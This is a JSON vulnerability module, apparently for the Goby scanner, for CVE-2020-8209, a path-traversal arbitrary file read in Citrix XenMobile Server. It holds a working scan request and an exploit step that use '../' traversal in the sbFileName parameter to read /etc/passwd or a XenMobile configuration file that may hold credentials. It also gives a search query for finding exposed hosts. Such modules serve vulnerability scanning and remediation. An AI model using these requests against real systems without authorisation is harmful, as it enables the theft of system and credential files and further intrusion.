{
  "Name": "Citrix XenMobile Arbitrary file read (CVE-2020-8209)",
  "Description": "Improper access control in Citrix XenMobile Server 10.12 before RP2, Citrix XenMobile Server 10.11 before RP4, Citrix XenMobile Server 10.10 before RP6 and Citrix XenMobile Server before 10.9 RP5 and leads to the ability to read arbitrary files.",
  "Product": "Citrix-XenMobile",
  "Homepage": "https://docs.citrix.com/en-us/xenmobile.html",
  "DisclosureDate": "2020-08-17",
  "Author": "itardc@163.com",
  "GifAddress": "https://raw.githubusercontent.com/gobysec/GobyVuls/master/Citrix/CVE-2020-8209/CVE-2020-8209.gif",
  "FofaQuery": "title=\"XenMobile\"",
  "GobyQuery": "title=\"XenMobile\"",
  "Level": "2",
  "Impact": "Leads to the ability to read arbitrary files.",
  "Recommendation": "Upgrade.",
  "References": [
    "https://support.citrix.com/article/CTX277457",
    "https://nvd.nist.gov/vuln/detail/CVE-2020-8209",
    "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8209"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "file",
      "type": "createSelect",
      "value": "/etc/passwd,/opt/sas/sw/config/sftu.properties",
      "show": ""
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "data": "",
        "data_type": "text",
        "follow_redirect": true,
        "method": "GET",
        "uri": "/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd"
      },
      "ResponseTest": {
        "checks": [
          {
            "bz": "",
            "operation": "==",
            "type": "item",
            "value": "200",
            "variable": "$code"
          },
          {
            "bz": "",
            "operation": "contains",
            "type": "item",
            "value": "fileDownload=true",
            "variable": "$head"
          },
          {
            "bz": "",
            "operation": "contains",
            "type": "item",
            "value": "root:x",
            "variable": "$body"
          }
        ],
        "operation": "AND",
        "type": "group"
      }
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "data": "",
        "data_type": "text",
        "follow_redirect": true,
        "method": "GET",
        "uri": "/jsp/help-sb-download.jsp?sbFileName=../../..{{{file}}}"
      },
      "SetVariable": [
        "output|lastbody"
      ]
    }
  ],
  "Tags": ["fileread"],
  "CVEIDs": [
    "CVE-2020-8209"
  ],
  "CVSSScore": "7.5",
  "AttackSurfaces": {
    "Application": ["Citrix-XenMobile"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  },
  "Disable": false
}